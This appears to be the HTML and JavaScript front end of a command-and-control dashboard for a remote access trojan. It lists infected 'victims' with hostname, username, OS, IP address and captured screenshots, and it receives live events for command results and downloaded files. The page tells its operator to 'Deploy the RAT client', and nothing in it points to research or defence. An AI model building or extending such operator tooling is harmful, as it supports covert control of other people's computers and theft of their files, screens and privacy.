<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Dashboard</title>
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            color: #fff;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            background: rgba(0,0,0,0.3);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header h1 {
            font-size: 2em;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: rgba(255,255,255,0.1);
            padding: 20px;
            border-radius: 10px;
            backdrop-filter: blur(10px);
        }
        .stat-card h3 {
            font-size: 0.9em;
            opacity: 0.8;
            margin-bottom: 10px;
        }
        .stat-card .number {
            font-size: 2.5em;
            font-weight: bold;
        }
        .victims-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 15px;
        }
        .victim-card {
            background: rgba(255,255,255,0.1);
            padding: 20px;
            border-radius: 10px;
            backdrop-filter: blur(10px);
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
        }
        .victim-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
        }
        .victim-card.online {
            border-left: 4px solid #4CAF50;
        }
        .victim-card.offline {
            border-left: 4px solid #f44336;
        }
        .victim-card .status {
            display: inline-block;
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 0.8em;
            margin-bottom: 10px;
        }
        .victim-card .status.online {
            background: #4CAF50;
        }
        .victim-card .status.offline {
            background: #f44336;
        }
        .victim-card h3 {
            margin-bottom: 5px;
        }
        .victim-card p {
            font-size: 0.9em;
            opacity: 0.8;
            margin: 5px 0;
        }
        .victim-card .screenshot {
            width: 100%;
            height: 150px;
            background: rgba(0,0,0,0.3);
            border-radius: 5px;
            margin-top: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .victim-card .screenshot img {
            max-width: 100%;
            max-height: 100%;
            border-radius: 5px;
        }
        .empty-state {
            text-align: center;
            padding: 50px;
            opacity: 0.6;
        }
        .refresh-btn {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1em;
            transition: background 0.3s;
        }
        .refresh-btn:hover {
            background: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎯 C2 Dashboard</h1>
            <button class="refresh-btn" onclick="refreshData()">🔄 Refresh</button>
        </div>

        <div class="stats">
            <div class="stat-card">
                <h3>Total Victims</h3>
                <div class="number" id="total-count">0</div>
            </div>
            <div class="stat-card">
                <h3>Online Now</h3>
                <div class="number" id="active-count">0</div>
            </div>
            <div class="stat-card">
                <h3>Offline</h3>
                <div class="number" id="offline-count">0</div>
            </div>
        </div>

        <div class="victims-grid" id="victims-container">
            <div class="empty-state">
                <h2>Waiting for victims...</h2>
                <p>Deploy the RAT client to start receiving connections</p>
            </div>
        </div>
    </div>

    <script>
        const socket = io();

        socket.on('new_victim', (data) => {
            console.log('New victim connected:', data.victim_id);
            refreshData();
        });

        socket.on('command_result', (data) => {
            console.log('Command result:', data);
        });

        socket.on('file_downloaded', (data) => {
            console.log('File downloaded:', data);
            refreshData();
        });

        socket.on('new_screenshot', (data) => {
            console.log('New screenshot:', data);
            refreshData();
        });

        async function refreshData() {
            try {
                const response = await fetch('/api/victims');
                const victims = await response.json();

                updateStats(victims);
                renderVictims(victims);
            } catch (error) {
                console.error('Error fetching victims:', error);
            }
        }

        function updateStats(victims) {
            const total = victims.length;
            const online = victims.filter(v => v.status === 'online').length;
            const offline = total - online;

            document.getElementById('total-count').textContent = total;
            document.getElementById('active-count').textContent = online;
            document.getElementById('offline-count').textContent = offline;
        }

        function renderVictims(victims) {
            const container = document.getElementById('victims-container');

            if (victims.length === 0) {
                container.innerHTML = `
                    <div class="empty-state">
                        <h2>Waiting for victims...</h2>
                        <p>Deploy the RAT client to start receiving connections</p>
                    </div>
                `;
                return;
            }

            container.innerHTML = victims.map(victim => `
                <div class="victim-card ${victim.status}" onclick="window.location.href='/victim/${victim.id}'">
                    <span class="status ${victim.status}">${victim.status.toUpperCase()}</span>
                    <h3>${victim.hostname}</h3>
                    <p>👤 ${victim.username}</p>
                    <p>💻 ${victim.os}</p>
                    <p>🌐 ${victim.ip_address}</p>
                    <p>🕐 Last seen: ${new Date(victim.last_seen).toLocaleString()}</p>
                    ${victim.screenshot_path ? `
                        <div class="screenshot">
                            <img src="/screenshot/${victim.id}" alt="Screenshot">
                        </div>
                    ` : ''}
                </div>
            `).join('');
        }

        // Auto refresh every 5 seconds
        setInterval(refreshData, 5000);
        refreshData();
    </script>
</body>
</html>
